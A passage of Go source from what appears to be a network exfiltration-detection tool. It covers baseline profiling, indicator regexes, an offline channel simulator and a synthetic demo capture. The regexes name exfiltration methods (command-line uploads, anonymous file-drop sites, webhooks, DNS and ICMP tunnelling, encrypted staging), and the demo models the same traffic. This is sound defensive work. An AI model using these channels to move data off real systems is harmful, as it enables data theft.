	if len(st.Timeline) >= 2 && st.EgressBytes > 0 {
		fmt.Println()
		fmt.Println("  " + col("Egress timeline", CY+B) + col(fmt.Sprintf("  (%d × %s bins)", len(st.Timeline), humanDur(st.BinSeconds)), DIM))
		fmt.Println("  " + col("│", CY) + col(sparkline(st.Timeline, 0), CY) + col("│", CY))
		fmt.Println("  " + col(fmt.Sprintf("%s → %s · peak %s at %s", st.Start, st.End, humanBytes(st.PeakBytes), st.PeakAt), DIM))
	}
	hostTable := func(title, peers string, hs []hostStat) {
		if len(hs) == 0 {
			return
		}
		fmt.Println()
		fmt.Println("  " + col(title, CY+B))
		var rows [][]string
		for _, h := range hs {
			ratio := float64(h.Out) / math.Max(float64(h.In), 1)
			rows = append(rows, []string{trunc2(h.Host, 30), humanBytes(h.Out), humanBytes(h.In), fmt.Sprintf("%.1f", ratio),
				strconv.Itoa(h.Peers), strconv.Itoa(h.Sessions), col(sparkline(h.Timeline, 16), CY)})
		}
		table([]string{"HOST", "OUT", "IN", "OUT:IN", peers, "SESS", "ACTIVITY"}, rows)
	}
	hostTable("Top egress sources", "DESTS", st.TopSources)
	hostTable("Top egress destinations", "CLIENTS", st.TopDests)
}

func statsText(st *TrafficStats, md bool) string {
	if st == nil {
		return ""
	}
	var b strings.Builder
	h := func(s string) {
		if md {
			b.WriteString("\n## " + s + "\n\n")
		} else {
			b.WriteString("\n" + s + "\n" + strings.Repeat("-", len(s)) + "\n")
		}
	}
	h("Traffic overview")
	fmt.Fprintf(&b, "Egress: %s", humanBytes(st.EgressBytes))
	if len(st.Timeline) >= 2 && st.EgressBytes > 0 {
		fmt.Fprintf(&b, " · %s → %s · peak %s at %s\nTimeline (%s bins): %s",
			st.Start, st.End, humanBytes(st.PeakBytes), st.PeakAt, humanDur(st.BinSeconds), sparkline(st.Timeline, 0))
	}
	b.WriteString("\n")
	list := func(title string, hs []hostStat) {
		h(title)
		if md {
			b.WriteString("| Host | Out | In | Peers | Sessions |\n|---|---|---|---|---|\n")
		}
		for _, x := range hs {
			if md {
				fmt.Fprintf(&b, "| %s | %s | %s | %d | %d |\n", x.Host, humanBytes(x.Out), humanBytes(x.In), x.Peers, x.Sessions)
			} else {
				fmt.Fprintf(&b, "  %-32s out %-10s in %-10s peers %-4d sessions %d\n", x.Host, humanBytes(x.Out), humanBytes(x.In), x.Peers, x.Sessions)
			}
		}
	}
	list("Top egress sources", st.TopSources)
	list("Top egress destinations", st.TopDests)
	return b.String()
}

// ====================================================================
//  HOST BASELINE (--learn / --baseline)
// ====================================================================

type hostProfile struct {
	Egress   int64            `json:"egress_bytes"`
	Hours    float64          `json:"observed_hours"`
	PeakRate float64          `json:"peak_bytes_per_hour"`
	Dests    map[string]int64 `json:"destinations"`
	DNS      map[string]int   `json:"dns_domains,omitempty"`
}

type baselineFile struct {
	Tool     string                  `json:"tool"`
	Version  string                  `json:"version"`
	Updated  string                  `json:"updated"`
	Captures int                     `json:"captures"`
	Hosts    map[string]*hostProfile `json:"hosts"`
}

var learnPath, baselinePath string

// profileTraffic summarises what each internal client normally does: where
// it sends data (destination → bytes), how fast, and which DNS domains it uses.
func profileTraffic(td *trafficData, chans []*channel) map[string]*hostProfile {
	hours := math.Max(td.last.Sub(td.first).Hours(), 1) // flows without timestamps count as one hour
	out := map[string]*hostProfile{}
	get := func(h string) *hostProfile {
		p := out[h]
		if p == nil {
			p = &hostProfile{Hours: hours, Dests: map[string]int64{}, DNS: map[string]int{}}
			out[h] = p
		}
		return p
	}
	for _, c := range chans {
		p := get(c.client)
		p.Egress += c.out
		p.Dests[destLabel(c)] += c.out
	}
	for _, q := range td.dns {
		if base, _ := baseDomain(q.qname); base != "" && q.client != "" {
			get(q.client).DNS[base]++
		}
	}
	for _, p := range out {
		p.PeakRate = float64(p.Egress) / p.Hours
	}
	return out
}

func loadBaseline(path string) (*baselineFile, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var bl baselineFile
	if err := json.Unmarshal(data, &bl); err != nil || bl.Tool != APPNAME {
		return nil, fmt.Errorf("%s: not an %s baseline", path, APPNAME)
	}
	if bl.Hosts == nil {
		bl.Hosts = map[string]*hostProfile{}
	}
	return &bl, nil
}

// learnBaseline merges this capture's profiles into path (created if absent).
func learnBaseline(path string, prof map[string]*hostProfile) (int, error) {
	bl := &baselineFile{Tool: APPNAME, Hosts: map[string]*hostProfile{}}
	if fileExists(path) {
		var err error
		if bl, err = loadBaseline(path); err != nil {
			return 0, err
		}
	}
	for h, p := range prof {
		o := bl.Hosts[h]
		if o == nil {
			bl.Hosts[h] = p
			continue
		}
		o.Egress += p.Egress
		o.Hours += p.Hours
		o.PeakRate = math.Max(o.PeakRate, p.PeakRate)
		if o.Dests == nil {
			o.Dests = map[string]int64{}
		}
		for d, n := range p.Dests {
			o.Dests[d] += n
		}
		if o.DNS == nil {
			o.DNS = map[string]int{}
		}
		for d, n := range p.DNS {
			o.DNS[d] += n
		}
	}
	bl.Version, bl.Updated = VERSION, time.Now().UTC().Format(time.RFC3339)
	bl.Captures++
	b, _ := json.MarshalIndent(bl, "", "  ")
	return len(bl.Hosts), os.WriteFile(path, append(b, '\n'), 0o600)
}

func fileExists(p string) bool { _, err := os.Stat(p); return err == nil }

// compareBaseline reports what a host does now that it never did while the
// baseline was learned: new destinations, new hosts, egress-rate spikes and
// heavy use of never-seen DNS domains.
func compareBaseline(bl *baselineFile, prof map[string]*hostProfile, src string) []Finding {
	var fs []Finding
	hosts := make([]string, 0, len(prof))
	for h := range prof {
		hosts = append(hosts, h)
	}
	sort.Strings(hosts)
	const newDestMin = 1 << 20
	for _, h := range hosts {
		cur, bp := prof[h], bl.Hosts[h]
		if bp == nil {
			if cur.Egress >= volMed {
				fs = append(fs, exFinding("EXF-BASE-NEWHOST", "Unprofiled host sending data", sevFor(cur.Egress), "T1041", src, h,
					fmt.Sprintf("%s sent %s to %d destination(s) but was never seen while the baseline was learned.",
						h, humanBytes(cur.Egress), len(cur.Dests)),
					"New egress-heavy hosts deserve an owner check before they become part of the baseline."))
			}
			continue
		}
		type nd struct {
			dest string
			n    int64
		}
		var news []nd
		for d, n := range cur.Dests {
			if _, ok := bp.Dests[d]; !ok && n >= newDestMin {
				news = append(news, nd{d, n})
			}
		}
		sort.Slice(news, func(i, j int) bool { return news[i].n > news[j].n })
		for i, x := range news {
			if i == 8 {
				fs = append(fs, exFinding("EXF-BASE-NEWDEST", "More new destinations", "low", "T1041", src, h,
					fmt.Sprintf("%d further never-seen destinations received ≥ 1 MB each.", len(news)-8), ""))
				break
			}
			fs = append(fs, exFinding("EXF-BASE-NEWDEST", "Upload to a never-seen destination", sevFor(x.n), "T1041", src,
				h+" → "+x.dest, fmt.Sprintf("%s uploaded to %s, a destination absent from %d learned destination(s).",
					humanBytes(x.n), x.dest, len(bp.Dests)),
				"Review first-time destinations that receive data; add sanctioned ones by re-learning."))
		}
		rate := float64(cur.Egress) / cur.Hours
		if ref := math.Max(bp.PeakRate, 1); cur.Egress >= volMed && rate > 3*ref {
			sev := "medium"
			if rate > 10*ref {
				sev = "high"
			}
			fs = append(fs, exFinding("EXF-BASE-VOLUME", "Egress far above this host's baseline", sev, "T1030", src, h,
				fmt.Sprintf("%s/h now vs a learned peak of %s/h (%.1f×); %s in total.",
					humanBytes(int64(rate)), humanBytes(int64(bp.PeakRate)), rate/ref, humanBytes(cur.Egress)),
				"Alert on per-host egress rate against its own history, not a global threshold."))
		}
		var nds []string
		for d, n := range cur.DNS {
			if bp.DNS[d] == 0 && n >= 100 {
				nds = append(nds, fmt.Sprintf("%s (%d)", d, n))
			}
		}
		sort.Strings(nds)
		if len(nds) > 0 {
			fs = append(fs, exFinding("EXF-BASE-DNS", "Heavy use of never-seen DNS domains", "low", "T1048.003", src, h,
				"queries: "+strings.Join(nds, ", "), "New domains with many lookups are where DNS tunnels start."))
		}
	}
	return fs
}

// ====================================================================
//  INDICATOR SCAN — scripts, plans, command logs (catalog markers +
//  channel heuristics; complements the traffic engine)
// ====================================================================

var channelHints = []struct {
	re               *regexp.Regexp
	title, sev, tech string
}{
	{regexp.MustCompile(`(?i)\b(?:nslookup|dig|Resolve-DnsName)\b.*\$|\bTXT\b.*(?:exfil|chunk|base32|base64)`), "DNS channel tooling", "high", "T1048.003"},
	{regexp.MustCompile(`\b(?:curl|wget)\b.*\s(?:-T\s|--upload-file[\s=]|-F\s+\S+=@|--form\s+\S+=@|--data-binary\s+@|--post-file[\s=])|(?i)\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b.*-InFile\b`), "Command-line file upload", "high", "T1048"},
	{regexp.MustCompile(`(?i)\bping\b.*(?:-p\s+[0-9a-f]{8,}|-l\s+\d{3,}|-s\s+\d{3,})`), "Ping with custom payload / size", "medium", "T1048"},
	{regexp.MustCompile(`(?i)hooks\.slack\.com|discord(?:app)?\.com/api/webhooks|api\.telegram\.org/bot`), "Chat webhook / bot API", "medium", "T1567.004"},
	{regexp.MustCompile(`(?i)\bs3://|aws\s+s3\s+cp|gsutil\s+cp|azcopy|rclone\s+(?:copy|sync)|mega(?:put|cmd)`), "Cloud storage sync tooling", "high", "T1567.002"},
	{regexp.MustCompile(`(?i)transfer\.sh|file\.io|gofile\.io|anonfiles|0x0\.st|bashupload|temp\.sh|catbox\.moe`), "Anonymous file-drop service", "high", "T1567.002"},
	{regexp.MustCompile(`\b(?:7z|7za|rar)\s+a\b.*\s-(?:p|hp)\S+|\bzip\b.*\s(?:-P\s|-e\s|--encrypt)|\bopenssl\s+(?:enc|aes-\S+)\b|\bgpg2?\b.*\s(?:-c|--symmetric)(?:\s|$)`), "Encrypted archive staging", "medium", "T1560.001"},
	{regexp.MustCompile(`\bsplit\s+(?:-b|--bytes)[\s=]|\bdd\b.*\bbs=\S+.*\bskip=|(?i)Get-Content\b.*-ReadCount`), "Data chunking", "medium", "T1030"},
	{regexp.MustCompile(`(?i)\bscp\b|\bsftp\b|\brsync\b.*::|\bftp\s+-n|\btftp\b.*\bput\b`), "File transfer over alternative protocol", "medium", "T1048"},
}

// scanIndicators scans a text input for exfil tooling and staging.
func scanIndicators(name string, data []byte) []Finding {
	fs := scanReader(name, bytes.NewReader(data))
	for i, ln := range strings.Split(string(data), "\n") {
		for _, h := range channelHints {
			if h.re.MatchString(ln) {
				ev := strings.TrimSpace(ln)
				if len(ev) > 160 {
					ev = ev[:160] + "…"
				}
				fs = append(fs, Finding{RuleID: "EXF-IND", Title: h.title, Severity: h.sev, Score: sevWeight[h.sev],
					Tactic: "Exfiltration", Technique: h.tech, File: name, Line: i + 1, Evidence: ev,
					Detail: "Exfiltration tooling / staging indicator.", Fprint: fingerprint(h.title, name, strconv.Itoa(i))})
			}
		}
	}
	// staging (archive / encrypt / split) followed by a transfer channel
	staged, sent := 0, 0
	for _, f := range fs {
		if f.RuleID != "EXF-IND" {
			continue
		}
		switch f.Technique {
		case "T1560.001", "T1030":
			staged++
		default:
			if f.Severity == "high" {
				sent++
			}
		}
	}
	if staged > 0 && sent > 0 {
		fs = append(fs, Finding{RuleID: "EXF-CHAIN", Title: "Staging → transfer chain", Severity: "critical",
			Score: sevWeight["critical"], Tactic: "Exfiltration", Technique: "T1041", File: name,
			Evidence: fmt.Sprintf("%d staging + %d transfer indicator(s)", staged, sent),
			Detail:   "Data is packed / encrypted / split and then sent out — the full exfiltration sequence.",
			Fprint:   fingerprint("chain", name)})
	}
	if h := shannonEntropy(data); h >= 7.5 && len(data) >= 4096 {
		fs = append(fs, Finding{RuleID: "EXF-ENT", Title: "Encrypted / compressed blob (possible staged loot)",
			Severity: "low", Score: sevWeight["low"], Tactic: "Collection", Technique: "T1560", File: name,
			Evidence: fmt.Sprintf("entropy %.2f bits/byte over %s", h, humanBytes(int64(len(data)))),
			Detail:   "Near-random content; check whether it belongs here.", Fprint: fingerprint("ent", name)})
	}
	sortFindings(fs)
	return fs
}

// ====================================================================
//  CHANNEL SIMULATOR — offline model, no traffic is generated.
//  Estimates what an exfil of N bytes over a channel looks like on the
//  wire and which of THIS tool's detections would fire, and when.
// ====================================================================

type simParams struct {
	Channel  string        // dns | icmp | https | cloud | ssh
	Size     int64         // bytes to move
	Chunk    int           // raw bytes per request / packet
	Interval time.Duration // gap between requests
}

type simRule struct {
	Rule, Verdict, Why string
	Fires              bool
	After              time.Duration // time until the rule would trigger
}

type simResult struct {
	Requests int64
	Wire     int64
	Duration time.Duration
	Rules    []simRule
}

func simulate(p simParams) (simResult, error) {
	if p.Size <= 0 || p.Chunk <= 0 {
		return simResult{}, errors.New("size and chunk must be > 0")
	}
	r := simResult{Requests: (p.Size + int64(p.Chunk) - 1) / int64(p.Chunk)}
	r.Duration = time.Duration(r.Requests-1) * p.Interval
	at := func(n int64) time.Duration { // time when the n-th request is sent
		if n < 1 {
			n = 1
		}
		return time.Duration(n-1) * p.Interval
	}
	reqFor := func(bytes int64) int64 { return (bytes + int64(p.Chunk) - 1) / int64(p.Chunk) }
	switch p.Channel {
	case "dns":
		enc := int(math.Ceil(float64(p.Chunk) * 8 / 5)) // base32
		if enc > 250 {
			return r, errors.New("DNS names are limited to 253 chars — use a chunk ≤ 150 bytes")
		}
		r.Wire = r.Requests * int64(28+12+enc+enc/63+20+4)
		// EXF-DNS: ≥20 unique subdomains, mean ≥18 chars, entropy ≥3.5 (base32 ≈ 4.9)
		fires := enc >= 18 && r.Requests >= 20
		sr := simRule{Rule: "EXF-DNS", Fires: fires, After: at(20)}
		if fires {
			sev := "medium"
			when := at(20)
			if hi := minI64(reqFor(10<<10), 300); r.Requests >= hi {
				sev, when = "high", at(hi)
			}
			sr.Verdict, sr.After = sev, when
			sr.Why = fmt.Sprintf("%d-char base32 labels; unique-subdomain threshold reached after 20 queries", enc)
		} else {
			sr.Why = fmt.Sprintf("labels of %d chars / %d queries stay under the 18-char · 20-query profile", enc, r.Requests)
		}
		r.Rules = append(r.Rules, sr)
	case "icmp":
		r.Wire = r.Requests * int64(p.Chunk+28)
		fires := p.Size >= 4<<10 && p.Chunk > 16
		sr := simRule{Rule: "EXF-ICMP", Fires: fires}
		if fires {
			sr.Verdict, sr.After = "medium", at(reqFor(4<<10))
			if p.Size >= 1<<20 {
				sr.Verdict, sr.After = "high", at(reqFor(1<<20))
			}
			sr.Why = "distinct non-ping payloads; 4 KB total triggers"
		} else {
			sr.Why = "payload too small to differ from stock ping"
		}
		r.Rules = append(r.Rules, sr)
	case "https", "cloud", "ssh":
		per := int64(p.Chunk) + int64(p.Chunk)/50 + 700 // TLS/HTTP framing
		r.Wire = r.Requests * per
		vol := simRule{Rule: "EXF-VOLUME"}
		name := "EXF-VOLUME"
		if p.Channel == "cloud" {
			name = "EXF-CLOUD"
		} else if p.Channel == "ssh" {
			name = "EXF-ALTPROTO"
		}
		vol.Rule = name
		thr := volMed
		if p.Channel != "https" {
			thr = 1 << 20
		}
		if r.Wire >= thr {
			vol.Fires = true
			vol.Verdict = sevFor(r.Wire)
			if vol.Verdict == "low" {
				vol.Verdict = "medium"
			}
			vol.After = at(reqFor(thr))
			vol.Why = fmt.Sprintf("cumulative egress to one destination crosses %s", humanBytes(thr))
		} else {
			vol.Why = fmt.Sprintf("total %s stays under the %s per-destination threshold", humanBytes(r.Wire), humanBytes(thr))
		}
		r.Rules = append(r.Rules, vol)
		ch := simRule{Rule: "EXF-CHUNKED"}
		if r.Requests >= 8 && p.Interval > 0 && p.Chunk >= 4096 && r.Wire >= 256<<10 {
			ch.Fires, ch.Verdict, ch.After = true, "medium", at(maxI64(8, reqFor(256<<10)))
			ch.Why = "fixed-size requests at a fixed cadence (interval/size CV ≈ 0)"
		} else {
			ch.Why = "needs ≥ 8 requests of ≥ 4 KB at a regular interval and ≥ 256 KB total"
		}
		r.Rules = append(r.Rules, ch)
	default:
		return r, fmt.Errorf("unknown channel %q (dns|icmp|https|cloud|ssh)", p.Channel)
	}
	return r, nil
}

func minI64(a, b int64) int64 {
	if a < b {
		return a
	}
	return b
}
func maxI64(a, b int64) int64 {
	if a > b {
		return a
	}
	return b
}

// parseSize reads "500MB", "2GB", "64k", "1048576".
func parseSize(s string) (int64, error) {
	s = strings.ToUpper(strings.TrimSpace(s))
	mult := int64(1)
	for _, u := range []struct {
		suf string
		m   int64
	}{{"GB", 1 << 30}, {"G", 1 << 30}, {"MB", 1 << 20}, {"M", 1 << 20}, {"KB", 1 << 10}, {"K", 1 << 10}, {"B", 1}} {
		if strings.HasSuffix(s, u.suf) {
			s, mult = strings.TrimSpace(strings.TrimSuffix(s, u.suf)), u.m
			break
		}
	}
	f, err := strconv.ParseFloat(s, 64)
	if err != nil || f < 0 {
		return 0, fmt.Errorf("bad size %q", s)
	}
	return int64(f * float64(mult)), nil
}

// ====================================================================
//  SYNTHETIC DEMO CAPTURE (in memory only — documentation addresses)
// ====================================================================

type pcapWriter struct {
	buf bytes.Buffer
	t   time.Time
}

func newPcapWriter(t time.Time) *pcapWriter {
	w := &pcapWriter{t: t}
	hdr := make([]byte, 24)
	binary.LittleEndian.PutUint32(hdr, 0xa1b2c3d4)
	binary.LittleEndian.PutUint16(hdr[4:], 2)
	binary.LittleEndian.PutUint16(hdr[6:], 4)
	binary.LittleEndian.PutUint32(hdr[16:], 262144)
	binary.LittleEndian.PutUint32(hdr[20:], 101) // raw IP
	w.buf.Write(hdr)
	return w
}

// ip4 writes one IPv4 packet; claimLen lets the IP header declare a longer
// packet than is stored (like a snaplen-truncated capture).
func (w *pcapWriter) ip4(dt time.Duration, src, dst string, proto byte, l4 []byte, claimL4 int) {
	w.t = w.t.Add(dt)
	if claimL4 < len(l4) {
		claimL4 = len(l4)
	}
	ip := make([]byte, 20)
	ip[0] = 0x45
	binary.BigEndian.PutUint16(ip[2:], uint16(min(20+claimL4, 65535)))
	ip[8], ip[9] = 64, proto
	copy(ip[12:], net.ParseIP(src).To4())
	copy(ip[16:], net.ParseIP(dst).To4())
	pkt := append(ip, l4...)
	rec := make([]byte, 16)
	binary.LittleEndian.PutUint32(rec, uint32(w.t.Unix()))
	binary.LittleEndian.PutUint32(rec[4:], uint32(w.t.Nanosecond()/1000))
	binary.LittleEndian.PutUint32(rec[8:], uint32(len(pkt)))
	binary.LittleEndian.PutUint32(rec[12:], uint32(20+claimL4))
	w.buf.Write(rec)
	w.buf.Write(pkt)
}

func tcpSeg(sp, dp int, flags byte, payload []byte) []byte {
	h := make([]byte, 20)
	binary.BigEndian.PutUint16(h, uint16(sp))
	binary.BigEndian.PutUint16(h[2:], uint16(dp))
	h[12], h[13] = 5<<4, flags
	return append(h, payload...)
}

func clientHello(sni string) []byte {
	ext := []byte{0, 0}
	sn := []byte{0, byte(len(sni) + 3), 0, 0, byte(len(sni))}
	sn = append(sn, sni...)
	binary.BigEndian.PutUint16(sn, uint16(len(sni)+3))
	ext = append(ext, byte(len(sn)>>8), byte(len(sn)))
	ext = append(ext, sn...)
	body := []byte{3, 3}
	body = append(body, make([]byte, 32)...)
	body = append(body, 0, 0, 2, 0x13, 0x01, 1, 0)
	body = append(body, byte(len(ext)>>8), byte(len(ext)))
	body = append(body, ext...)
	hs := append([]byte{1, 0, byte(len(body) >> 8), byte(len(body))}, body...)
	return append([]byte{0x16, 3, 1, byte(len(hs) >> 8), byte(len(hs))}, hs...)
}

// tcpSession writes a handshake, an optional first client payload and
// `chunks` client data segments each declaring `chunkLen` bytes.
func (w *pcapWriter) tcpSession(dt time.Duration, c, s string, cp, sp int, first []byte, chunks, chunkLen int, respLen int) {
	w.ip4(dt, c, s, 6, tcpSeg(cp, sp, 0x02, nil), 0)
	w.ip4(time.Millisecond, s, c, 6, tcpSeg(sp, cp, 0x12, nil), 0)
	w.ip4(time.Millisecond, c, s, 6, tcpSeg(cp, sp, 0x10, nil), 0)
	if first != nil {
		w.ip4(time.Millisecond, c, s, 6, tcpSeg(cp, sp, 0x18, first), 0)
	}
	for i := 0; i < chunks; i++ {
		w.ip4(time.Millisecond, c, s, 6, tcpSeg(cp, sp, 0x18, nil), 20+chunkLen)
	}
	if respLen > 0 {
		w.ip4(time.Millisecond, s, c, 6, tcpSeg(sp, cp, 0x18, nil), 20+respLen)
	}
}

func dnsQuery(id uint16, name string, qtype uint16) []byte {
	m := []byte{byte(id >> 8), byte(id), 1, 0, 0, 1, 0, 0, 0, 0, 0, 0}
	for _, l := range strings.Split(name, ".") {
		m = append(m, byte(len(l)))
		m = append(m, l...)
	}
	m = append(m, 0, byte(qtype>>8), byte(qtype), 0, 1)
	return m
}

func udpDgram(sp, dp int, payload []byte) []byte {
	h := make([]byte, 8)
	binary.BigEndian.PutUint16(h, uint16(sp))
	binary.BigEndian.PutUint16(h[2:], uint16(dp))
	binary.BigEndian.PutUint16(h[4:], uint16(8+len(payload)))
	return append(h, payload...)
}

// demoCapture builds a synthetic capture: normal browsing plus DNS, ICMP,
// file-drop and SSH exfiltration (RFC 5737 / example addresses only).
func demoCapture() []byte {
	w := newPcapWriter(time.Date(2026, 10, 30, 9, 0, 0, 0, time.UTC))
	rnd := uint32(2463534242)
	next := func() byte { rnd ^= rnd << 13; rnd ^= rnd >> 17; rnd ^= rnd << 5; return byte(rnd) }
	// normal: browsing (download-heavy) + regular DNS
	for i := 0; i < 12; i++ {
		w.tcpSession(20*time.Second, "10.0.0.5", "93.184.216.34", 50000+i, 443, clientHello("www.example.com"), 1, 600, 900000)
		w.ip4(time.Second, "10.0.0.5", "10.0.0.1", 17, udpDgram(40000+i, 53, dnsQuery(uint16(i), "www.example.com", 1)), 0)
	}
	// DNS exfil: base32 chunks under one domain (TXT)
	b32 := "abcdefghijklmnopqrstuvwxyz234567"
	for i := 0; i < 400; i++ {
		var lab []byte
		for j := 0; j < 52; j++ {
			lab = append(lab, b32[next()%32])
		}
		name := fmt.Sprintf("%s.%d.cdn-sync.example.net", lab, i)
		w.ip4(2*time.Second, "10.0.0.7", "10.0.0.1", 17, udpDgram(41000+i, 53, dnsQuery(uint16(1000+i), name, 16)), 0)
	}
	// ICMP exfil: random 512-byte payloads + one host doing a normal ping
	for i := 0; i < 60; i++ {
		pl := make([]byte, 512)
		for j := range pl {
			pl[j] = next()
		}
		w.ip4(time.Second, "10.0.0.9", "198.51.100.20", 1, append([]byte{8, 0, 0, 0, 0, 1, 0, byte(i)}, pl...), 0)
		ping := make([]byte, 56)
		for j := 8; j < 56; j++ {
			ping[j] = byte(j)
		}
		w.ip4(10*time.Millisecond, "10.0.0.5", "192.0.2.1", 1, append([]byte{8, 0, 0, 0, 0, 2, 0, byte(i)}, ping...), 0)
	}
	// file-drop: 20 uploads of ~2 MB every 30 s to transfer.sh
	for i := 0; i < 20; i++ {
		w.tcpSession(30*time.Second, "10.0.0.12", "203.0.113.50", 52000+i, 443, clientHello("transfer.sh"), 32, 65000, 400)
	}
	// SSH bulk copy to an external host (~60 MB)
	w.tcpSession(5*time.Second, "10.0.0.15", "192.0.2.80", 53000, 22, []byte("SSH-2.0-OpenSSH_9.6\r\n"), 940, 65000, 50000)
	// browser DoH lookups (benign-looking) and a DoH tunnel pushing ~6 MB up
	for i := 0; i < 3; i++ {
		w.tcpSession(2*time.Second, "10.0.0.5", "1.1.1.1", 54000+i, 443, clientHello("cloudflare-dns.com"), 2, 300, 2000)
		w.tcpSession(2*time.Second, "10.0.0.22", "8.8.8.8", 54100+i, 443, clientHello("dns.google"), 32, 65000, 30000)
	}
	// C2 beacon: no SNI, ~60 s ± 3 s, tiny check-ins
	for i := 0; i < 30; i++ {
		jit := time.Duration(int(next()%7)-3) * time.Second
		w.tcpSession(60*time.Second+jit, "10.0.0.20", "203.0.113.77", 55000+i, 8443, nil, 1, 380, 210)
	}
	return w.buf.Bytes()
}

// ====================================================================
//  ANALYSIS DRIVER (auto-detects input type)
// ====================================================================

type analysis struct {
	Report  Report
	Summary *TrafficSummary
	Traffic bool
	Notes   []string // baseline learn / compare messages
}

// analyzePaths loads every input: captures / Zeek logs / flow CSVs are merged
// into one traffic model; anything else goes through the indicator scanner.
func analyzePaths(paths []string) (analysis, error) {
	td := newTraffic()
	var textFs []Finding
	var names []string
	traffic := false
	for _, p := range paths {
		names = append(names, filepath.Base(p))
		ok, err := td.LoadInput(p)
		if err != nil {
			return analysis{}, fmt.Errorf("%s: %w", p, err)
		}
		if ok {
			traffic = true
			continue
		}
		data, err := os.ReadFile(p)
		if err != nil {
			return analysis{}, err
		}
		textFs = append(textFs, scanIndicators(filepath.Base(p), data)...)
	}
	res := analysis{Traffic: traffic}
	var fs []Finding
	if traffic {
		tf, sum := AnalyzeTraffic(td)
		fs = append(fs, tf...)
		res.Summary = &sum
		prof := profileTraffic(td, sum.chans)
		if baselinePath != "" {
			bl, err := loadBaseline(baselinePath)
			if err != nil {
				return analysis{}, err
			}
			fs = append(fs, compareBaseline(bl, prof, strings.Join(td.sources, ","))...)
			res.Notes = append(res.Notes, fmt.Sprintf("compared with baseline %s (%d hosts, %d capture(s), updated %s)",
				baselinePath, len(bl.Hosts), bl.Captures, bl.Updated))
		}
		if learnPath != "" {
			n, err := learnBaseline(learnPath, prof)
			if err != nil {
				return analysis{}, err
			}
			res.Notes = append(res.Notes, fmt.Sprintf("baseline %s updated: %d host profile(s) from this capture, %d in total",
				learnPath, len(prof), n))
		}
	} else if baselinePath != "" || learnPath != "" {
		res.Notes = append(res.Notes, "baseline options need traffic input (pcap / Zeek / flow CSV)")
	}
	fs = append(fs, textFs...)
	if fs == nil {
		fs = []Finding{}
	}
	mode := "indicator-scan"
	if traffic {
		mode = "traffic"
	}
	res.Report = buildReport(mode, strings.Join(names, ", "), fs)
	if res.Summary != nil {
		res.Report.Traffic = res.Summary.Stats
	}
	return res, nil
}

func filterMinSev(fs []Finding, min string) []Finding {
	out := []Finding{}
	for _, f := range fs {
		if sevRank[strings.ToLower(f.Severity)] >= sevRank[strings.ToLower(min)] {
			out = append(out, f)
		}
	}
	return out
}

func trunc2(s string, n int) string {
	r := []rune(s)
	if len(r) <= n {
		return s
	}
	return string(r[:n-1]) + "…"
}

func sevLabel(s string) string { return col(strings.ToUpper(s), sevColor(s)) }

// printAnalysis renders a traffic / indicator report in the TUI.
func printAnalysis(a analysis) {
	if s := a.Summary; s != nil {
		sectionHeader("Traffic Overview")
		kv("Inputs", strings.Join(s.Sources, ", "))
		if s.Packets > 0 {
			kv("Packets", strconv.Itoa(s.Packets))
		}
		kv("Sessions", fmt.Sprintf("%d (%d egress channels)", s.Sessions, s.EgressChannels))
		kv("DNS queries", strconv.Itoa(s.DNSQueries))
		kv("ICMP flows", strconv.Itoa(s.ICMPFlows))
		if s.Span > 0 {
			kv("Time span", s.Span.Round(time.Second).String())
		}
		kv("Egress volume", humanBytes(s.EgressBytes))
		printStats(s.Stats)
		fmt.Println()
	}
	for _, n := range a.Notes {
		info(n)
	}
	if len(a.Notes) > 0 {
		fmt.Println()
	}
	sectionHeader("Findings")
	rep := a.Report
	if len(rep.Findings) == 0 {
		okMsg("No exfiltration indicators found.")
	} else {
		var rows [][]string
		for _, f := range rep.Findings {
			ev := f.Evidence
			if f.Line > 0 {
				ev = fmt.Sprintf("%s:%d  %s", f.File, f.Line, f.Evidence)
			}
			rows = append(rows, []string{sevLabel(f.Severity), f.RuleID, trunc2(f.Title, 36), f.Technique, trunc2(ev, 44)})
		}
		table([]string{"SEV", "RULE", "FINDING", "MITRE", "WHERE"}, rows)
		fmt.Println()
		n := 0
		for _, f := range rep.Findings {
			if sevRank[strings.ToLower(f.Severity)] < sevRank["medium"] || f.Detail == "" {
				continue
			}
			if n++; n > 12 {
				info("… more in the exported report")
				break
			}
			fmt.Println("  " + col("•", CY) + " " + col(f.Title, W+B) + col("  "+f.Evidence, DIM))
			fmt.Println("    " + col(f.Detail, W))
		}
	}
	fmt.Println()
	gradeLineOut(rep)
}

// ====================================================================
//  SIMULATOR UI
// ====================================================================

func printSim(p simParams, r simResult) {
	sectionHeader("Channel Simulation (offline model — nothing is sent)")
	kv("Channel", p.Channel)
	kv("Data", humanBytes(p.Size))
	kv("Chunk", fmt.Sprintf("%d B per request", p.Chunk))
	kv("Interval", p.Interval.String())
	kv("Requests", strconv.FormatInt(r.Requests, 10))
	kv("On the wire", humanBytes(r.Wire)+fmt.Sprintf("  (%.0f%% overhead)", (float64(r.Wire)/float64(p.Size)-1)*100))
	kv("Duration", r.Duration.Round(time.Second).String())
	fmt.Println()
	var rows [][]string
	caught := false
	for _, ru := range r.Rules {
		v := col("would not fire", GRN)
		when := "-"
		if ru.Fires {
			v = sevLabel(ru.Verdict)
			when = ru.After.Round(time.Second).String()
			caught = true
		}
		rows = append(rows, []string{ru.Rule, v, when, trunc2(ru.Why, 72)})
	}
	table([]string{"DETECTION", "RESULT", "TIME TO ALERT", "WHY"}, rows)
	fmt.Println()
	if caught {
		okMsg("This test would be detected by " + APPNAME + "'s default rules.")
	} else {
		warnMsg("No default rule fires — a detection gap: tune thresholds (--vol-med) or add per-destination")
		warnMsg("aggregation over a longer window before running this test.")
	}
}

func uiSimulate() {
	sectionHeader("Channel Simulator")
	info("Models an authorised exfil test offline and shows which detections it would trip.")
	fmt.Println()
	ch := strings.ToLower(prompt("channel [dns|icmp|https|cloud|ssh] (blank = dns)"))
	if ch == "" {
		ch = "dns"
	}
	sz, err := parseSize(defaultStr(prompt("data size (e.g. 5MB)"), "5MB"))
	if err != nil {
		errMsg(err.Error())
		return
	}
	defChunk := map[string]string{"dns": "120", "icmp": "512", "https": "1048576", "cloud": "4194304", "ssh": "33554432"}[ch]
	chunk, err := parseSize(defaultStr(prompt("bytes per request (blank = "+defChunk+")"), defChunk))
	if err != nil {
		errMsg(err.Error())
		return
	}
	iv, err := time.ParseDuration(defaultStr(prompt("interval between requests (e.g. 1s, 30s)"), "1s"))
	if err != nil {
